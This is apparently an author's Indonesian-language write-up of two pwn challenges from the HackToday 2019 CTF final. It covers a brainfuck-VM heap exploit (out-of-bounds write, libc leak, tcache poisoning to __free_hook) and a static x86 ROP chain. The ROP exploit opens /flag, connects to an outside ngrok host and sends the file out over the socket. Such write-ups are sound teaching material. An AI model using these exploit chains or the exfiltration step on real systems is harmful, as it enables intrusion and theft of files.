---
title: "HackToday 2019 Final - pwn"
description: "Editorial untul soal-soal yang saya buat untuk HackToday Final CTF 2019"
pubDate: "August 27 2019"
tags: ["ctf-writeup", "pwn"]
---

## vmxck

Desain awal soal ini sebenarnya ada hubungan dengan virtualisasi pada mesin dan bukan termasuk bagian dari _pwn_. Iya, ini awalnya akan dijadikan soal reversing dengan register state based vm dengan `kvm`. ![vm di dalam vm](https://imgs.xkcd.com/comics/xkcde.png)_vm di dalam vm_ Beberapa hari sebelum final, input soal-soal untuk reversing ternyata udah lumayan banyak, rencana untuk lanjut dan menyelesaikan soal ini jadi gagal, wkwkw. Agak malas untuk memikirkan ide lain, saya pakai ide “vm” lagi dan gak berbeda jauh dari soal tahun lalu `anoneanone`. Soal ini masih sekitar brainfuck, _seharusnya_ (belum di-cek :p) tidak ada overflow pada input dan double free. Bug justru terletak pada OOB akses data cell.

```c
struct vmx {
  char* prog;
  unsigned char* data;
} vmx[20];
```

Diberikan space sebanyak 20 “vm”, dengan setiap “vm” mempunyai `.data` dan `.prog` masing-masing. Sudah dijelaskan sebelumnya terdapat OOB pada akses data, dengan ukuran program yang sama besarnya dengan ukuran data.

```c
  vmx[idx].prog = malloc(0x250);
  vmx[idx].data = malloc(0x250);
```

Sebelum bahas lebih lanjut, ini helper functions untuk memudahkan interaksi dengan program,

```py
def create(bf):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(bf))

def run(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    return r.recvuntil('1. ', 1)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))
```

Dengan OOB pada akses `.data`, salah satu yang dapat dilakukan adalah mengganti metadata dari heap chunk .data itu sendiri. ukuran dari chunk ini diubah menjadi lebih besar dari ukuran yang dapat ditampung tcache, tujuannya untuk mendapat leak libc.

```py
create('.')
# pwndbg> dq $rebase((long*)&vmx)
# 0000555555756060     000055555575a270 000055555575a4d0
# 0000555555756070     0000000000000000 0000000000000000
# 0000555555756080     0000000000000000 0000000000000000
# 0000555555756090     0000000000000000 0000000000000000
# pwndbg> dq 0x55555575a4c0
# 000055555575a4c0     0000000000000000 0000000000000261
# 000055555575a4d0     0000000000000000 0000000000000000
#                                    ^^--------------------- mulai .data vmx[0]
# 000055555575a4e0     0000000000000000 0000000000000000
# 000055555575a4f0     0000000000000000 0000000000000000
```

karena perlu chunk dengan ukuran lebih besar dari ukuran sebenarnya, diperlukan “fake” chunk untuk bypass `"double free or corruption (!prev)"`.

```py
create('.')
create('.')
# pwndbg> dq $rebase((long*)&vmx)
# 0000555555756060     000055555575a270 000055555575a4d0
# 0000555555756070     000055555575a730 000055555575a990
# 0000555555756080     0000000000000000 0000000000000000
# 0000555555756090     0000000000000000 0000000000000000
```

dengan begitu ukuran chunk bisa diubah menjadi `(0x55555575a990-0x55555575a4d0) | PREV_INUSE = 0x4c1`. Dalam brainfuck, .data ptr hanya perlu di shift ke kiri sebanyak 8 kali untuk mencapai chunk metadata. Setelah itu, dengan `delete(0)` akan didapatkan libc leak.

```py
payload  = '<<<<<<<<' # shift kiri .data ptr
payload += '+' * (0xc0-0x60)
payload += '>++'
create(payload)
create('.')

run(0)
# pwndbg> dq 0x55555575a4c0
# 000055555575a4c0     0000000000000000 00000000000004c1
# 000055555575a4d0     0000000000000000 0000000000000000
# 000055555575a4e0     0000000000000000 0000000000000000
# 000055555575a4f0     0000000000000000 0000000000000000

delete(0)
# pwndbg> dq 0x55555575a4c0
# 000055555575a4c0     0000000000000000 00000000000004c1
# 000055555575a4d0     0000155555521ca0 0000155555521ca0 !!!!! leak
# 000055555575a4e0     0000000000000000 0000000000000000
# 000055555575a4f0     0000000000000000 0000000000000000
```

untuk mendapatakan leak, bisa gunakan instruksi `.`/`putchar` satu per satu dari .data cell. Ini bisa dilakukan karena setelah `free`, isi data tidak dikosongkan (`memset`) sama sekali.

```py
payload  = '.>' * 8
create(payload)
libc.address = (u64(run(0)) - libc.sym['__malloc_hook']) & 0xFFFFFFFFFFFFF000
info('libc 0x%x' % (libc.address))
```

setelah leak didapat yang perlu dikontrol selanjutnya adalah alokasi dari `malloc`. tcache poisoning disini bisa dilakukan, tapi dengan limitasi ukuran program hanya sebesar 0x250 dan tidak ada uaf. “shift” pointer data berulang kali dengan batasan ukuran program untuk mengotrol chunk lain dengan “`<`” / “`>`” juga tidak bisa. Trik yang digunakan disini adalah `[<-]`. Sebagai visualisasi,

```
    000055555575axxx     0000000000000000 0000000000000261 .prog
    000055555575axxx     ................ ................
    000055555575axxx     0000000000000007 0000000000000000
                                       ^^--------------------- mulai .prog vmx[n - 1]
    ...
    ...
    000055555575axxx     0000000000000000 0000000000000261 .data
    000055555575axxx     0000000000000000 0000000000000000
                                       ^^--------------------- mulai .data vmx[n]
    000055555575axxx     0000000000000000 0000000000000000
    000055555575axxx     0000000000000000 0000000000000000
```

`[<-------]`, `]` akan mengecek apakah `*ptr == 0`, jika tidak, loop akan tetap dieksekusi. Disini trik yang diguakan adalah shift data terus sampai ke posisi `*ptr == 7` (perhatikan bahwa di dalam loop, sebelum `]` terdapat 7 \* `-`). Byte yang dilewati memang akan menjadi _amburadul_, tapi akhirnya tidak perlu dipedulikan juga, yang penting sudah bisa mengontrol chunk lain dan ratusan byte untuk program sudah dihemat dengan cara seperti ini.

```py
payload  = '[>---]'
create(payload) # 3

payload  = p64(0)
payload += p64(0)
payload += p8(3) # unique val
create(payload) # 4

# pwndbg> dq $rebase((long*)&vmx) 10
# 0000555555756060     000055555575a270 000055555575a4d0
# 0000555555756070     000055555575a730 000055555575a990
# 0000555555756080     000055555575a730 000055555575abf0
# 0000555555756090     000055555575ae50 000055555575b0b0
# 00005555557560a0     000055555575b310 000055555575b570
# pwndbg> dq 0x55555575b0a0
# 000055555575b0a0     0000000000000000 0000000000000261
# 000055555575b0b0     0000000000000000 0000000000000000
#                                    ^^-------------------- vmx[3].data
# 000055555575b0c0     0000000000000000 0000000000000000
# 000055555575b0d0     0000000000000000 0000000000000000
# pwndbg> dq 0x55555575b300
# 000055555575b300     0000000000000000 0000000000000261
# 000055555575b310     0000000000000003 0000000000000000
#                                    ^^-------------------- unique value @ vmx[4].prog
# 000055555575b320     0000000000000000 0000000000000000
# 000055555575b330     0000000000000000 0000000000000000

delete(4)
run(3)
# pwndbg> dq 0x55555575b300
# 000055555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e
# 000055555575b310     fdfd52525272b26d fdfdfdfdfdfdfdfd
# 000055555575b320     0000000000000000 0000000000000000
# 000055555575b330     0000000000000000 0000000000000000
```

next step, tcache poisoning perlu bisa tulis pointer. Dengan input yang terbatas ini, ada cara yang lebih baik untuk menulis pointer dibandingkan dengan menambahkan isi cell secara manual, yakni copy value dari cell lain. Chunk yang dapat dikontrol sekarang adalah bagian `.prog`, artinya kita bisa menambahkan arbitrary data melalui input. value yang akan dicopy adalah `__free_hook`,

```py
payload  = '[>---]'
payload += '<+++' * 8 # perbaiki cell src, hancur sebelumnya karena [>---]
payload += '<[-]' * 8 # kosongin cell dest
payload += '>' * 8 # balik ke cell src
payload += '[-<<<<<<<<+>>>>>>>>]>' * 8 # copy value dari src ke dest cells
create(payload) # 3

payload  = p64(libc.sym['__free_hook'])
payload += p64(libc.sym['__free_hook'])
payload += p8(3) # unique val
create(payload) # 4

delete(4)
# pwndbg> dq 0x55555575b300
# 000055555575b300     0000000000000000 0000000000000261
# 000055555575b310     000055555575b570 00001555555238e8
# 000055555575b320     0000000000000003 0000000000000000
# 000055555575b330     0000000000000000 0000000000000000
run(3)
# pwndbg> dq 0x55555575b300
# 000055555575b300     fdfdfdfdfdfdfdfd fdfdfdfdfdfdff5e
# 000055555575b310     00001555555238e8 0000000000000000
# 000055555575b320     0000000000000000 0000000000000000
# 000055555575b330     0000000000000000 0000000000000000
# pwndbg> bins
# tcachebins
# 0x260 [  2]: 0x55555575b310 —▸ 0x1555555238e8 (__free_hook) ◂— 0x0
```

Oh, iya, sebelum `malloc` hancur karena tcache poisoning ini, lebih baik untuk menyiapkan `"/bin/sh"`.

```py
create('/bin/sh\x00') # 2

payload  = '[>---]'
payload += '<+++' * 8 # perbaiki cell src, hancur sebelumnya karena [>---]
payload += '<[-]' * 8 # kosongin cell dest
payload += '>' * 8 # balik ke cell src
payload += '[-<<<<<<<<+>>>>>>>>]>' * 8 # copy value dari src ke dest cells
create(payload) # 3

payload  = p64(libc.sym['__free_hook'])
payload += p64(libc.sym['__free_hook'])
payload += p8(3) # unique val
create(payload) # 4

delete(4)
run(3)
```

Request `malloc` kedua setelah ini seharunya sudah mendarat di `__free_hook`, tapi karena `create()` itu sendiri melakukan 2 request `malloc`, untuk `.prog` dan `.data`, maka `.data`\-lah yang akan mendarat di `__free_hook`. Berbeda dengan sebelumnya dimana kita bisa memanfaatkan value yang ditambahkan melalui input karena berada di `.prog`, kali ini `.data` hanya bisa memanfaatkan aritmatiknya saja tanpa arbitrary data melalui user input.

```py
payload  = get_min((libc.sym['system'] >>  0) & 0xff)
payload += get_min((libc.sym['system'] >>  8) & 0xff)
payload += get_min((libc.sym['system'] >> 16) & 0xff)
payload += get_min((libc.sym['system'] >> 24) & 0xff)
payload += get_min((libc.sym['system'] >> 32) & 0xff)
payload += get_min((libc.sym['system'] >> 40) & 0xff)
create(payload) # 4
run(4)
# pwndbg> tel &__free_hook
# 00:0000│   0x1555555238e8 (__free_hook) —▸ 0x1555553b2e60 (system) ◂— test   rdi, rdi
# 01:0008│   0x1555555238f0 (__malloc_initialize_hook@GLIBC_2.2.5) ◂— 0x0
```

dengan begitu, `delete(2)` seharusnya sudah memberikan shell, karena tadi sudah `create("/bin/sh")` pada index 2 dan `__free_hook` sudah menunjuk kepada `system`

```py
# profit
delete(2)
```

## ezrop revenge

Soal ini ada kaitannya dengan `ezrop` pada [kualifikasi](/blog/hacktoday-2019-quals-pwn/#ezrop), dengan twist closed std{in,out,err}, static binary, x86, dengan EBP yang sudah di-_poison_ seperti yang saya tulis [sebelumnya](/blog/hacktoday-2019-quals-pwn/#ezrop). Kalau dipikir lagi ini sebenarnya tidak menambahkan hal baru selain closed I/O, sehingga pada akhirnya saya membuat soal ini dengan buffer overflow biasa tanpa tambahan kerumitan lainnya. Kurang lebih seperti ini kodenya,

```c
#include <unistd.h>

int main() {
    char buf[...];
    write(1, "no view(), no surrender!\n", ...);
    read(0, buf, ...);
    close(2);
    close(1);
    close(0);
}
```

closed I/O ini didapat ide dari soal ISITDTU Final, `babyarmv2`, beberapa hari lalu, kudos to orgs.

Intended solution dari soal ini dengan buka socket fd dan connect ke server dan menulis isi file `flag` pada fd tersebut. Sebelum itu semua yang diperlukan adalah arbitrary write primitive dengan `mov [dst], src` dan untungnya terdapat gadget seperti ini pada binary.

```py
# 0x08057bd2: mov dword ptr [edx], eax; ret;
# 0x080ab5ca: pop eax; ret;
# 0x0806ee8b: pop edx; ret;

def write_where_what(where, what):
    payload  = p32(0x080ab5ca)
    payload += p32(what)
    payload += p32(0x0806ee8b)
    payload += p32(where)
    payload += p32(0x08057bd2)
    return payload
```

arbitrary write primitive ini bisa digunakan dengan fungsi lain untuk memudahkan penulisan string panjang, `write_str`,

```py
def write_str(where, data):
    payload  = ''
    data_split = [data[i:i+4].ljust(4, '\x00') for i in range(0, len(data), 4)]
    for d in data_split:
        payload += write_where_what(where, u32(d))
        where += 4
    return payload
```

`write_str` ini berguna untuk menyiapkan _argument_ yang digunakan pada syscall, misalnya `open(3)`. btw, ada tambahan juga, fungsi untuk memudahkan memanggil syscall.

```py
# 0x0806eeb2: pop ecx; pop ebx; ret;
# 0x0806f7c0: int 0x80; ret;

def syscall(eax, ebx=0, ecx=0, edx=0):
    payload  = p32(0x0806ee8b)
    payload += p32(edx)
    payload += p32(0x080ab5ca)
    payload += p32(eax)
    payload += p32(0x0806eeb2)
    payload += p32(ecx)
    payload += p32(ebx)
    payload += p32(0x0806f7c0)
    return payload
```

_the exploit_, saya tidak akan terlalu membahas dalam `sokcetcall` syscall karena sudah [ada](https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/) [banyak](https://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html) [yang](#) [membahas](https://medium.com/@chaudharyaditya/slae-0x2-linux-x86-reverse-shellcode-d7126d638aff) tentang ini sebelumnya.

```py
def exploit(REMOTE):
    payload  = 'AAAAAAAAAAAAAAAAAAAA'

    # open flag
    payload += write_str(elf.bss(0x10), '/flag\x00')
    payload += syscall(5, elf.bss(0x10), 0, 0)

    # open socket
    sock_arg  = p32(2)
    sock_arg += p32(1)
    sock_arg += p32(0)
    payload += write_str(elf.bss(0x20), sock_arg)
    # socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    payload += syscall(0x66, 1, elf.bss(0x20))

    # connect
    IPHEX = 0x030ed4ad # 0.tcp.ngrok.io
    connect_struct  = p32(0x0b290002) # port: 1507, domain: AF_INET
    connect_struct += p32(IPHEX)[::-1]
    payload += write_str(elf.bss(0x30), connect_struct)

    connect_arg  = p32(1) # sockfd
    connect_arg += p32(elf.bss(0x30)) # connect_struct
    connect_arg += p32(0x10) # connect_struct size
    payload += write_str(elf.bss(0x100), connect_arg)
    # connect(sockfd, (struct sockaddr *) &connect_struct, 0x10)
    payload += syscall(0x66, 3, elf.bss(0x100))

    # read flag
    payload += syscall(3, 0, elf.bss(0x200), 0x100)

    # write to sockfd
    payload += syscall(4, 1, elf.bss(0x200), 0x100)

    r.sendafter('\n', payload)
```
